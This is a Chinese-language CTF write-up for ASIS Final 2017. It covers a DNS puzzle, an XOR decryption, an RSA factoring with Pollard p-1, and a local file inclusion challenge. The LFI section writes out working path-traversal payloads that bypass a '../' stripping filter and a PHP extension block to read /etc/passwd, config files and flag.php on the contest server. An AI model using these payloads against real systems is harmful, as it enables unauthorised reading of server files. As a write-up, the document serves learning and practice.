# ASIS Final 2017

## Dig Dug

`dig digx.asisctf.com` 找 ip

`dig -x 192.81.223.250` dns 反查 domain name

找到一個新的 domain name -> airplane.asisctf.com

去瀏覽發現一個神秘的 `./js.js`，然後在 browser console 執行 `./js.js`

會印出主辦單位給的好心提示 ( 就是說要開飛航模式才看的到 flag )

\> window.help()

\> window.dispatchEvent(new Event('offline'))

噴 flag

## Mathilda

用 wappalyzer 看出他是用 apache 2.4.25

```html
<!-- created by ~rooney -->
```

index page 有這一行所以猜他有 rooney 的 user 開 public_html 出來 ( http://178.62.48.181/~rooney/ )

發現他可以 local file inclusion ( http://178.62.48.181/~rooney/?path=rooney )

http://178.62.48.181/~rooney/?path=../../../../../../etc/passwd 沒成功

http://178.62.48.181/~rooney/?path=../rooney 得到跟 http://178.62.48.181/~rooney/?path=rooney 結果一樣，猜測他是用字串取代把 `../` 取代成空的

http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd 成功

看到 th1sizveryl0ngus3rn4me 這個 user

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.php

會擋 php，沒關係，用 `../` 繞過

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.p../hp

看到他 `require 'flag.php'`

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.p../hp

噴 flag

小插曲 : 

瀏覽 http://178.62.48.181/~rooney/?path=..././..././..././..././etc/apache2/vhost/host.conf

```
...
    ServerAdmin webmaster@localhost
    DocumentRoot /flag/html/
    ServerName flagishere
...
```

在 `/etc/hosts` 加上 178.62.48.181 flagishere，去瀏覽 http://flagishere，然後就噴 forbidden

以為有什麼神奇的東西，原來是被耍啦

## Simple Crypto

xor 加密有給 key

直接解密回去

## Handicraft RSA

他的 p-1 和 q-1 有很多質因數

用 pollard p-1 algorithm 就解完了
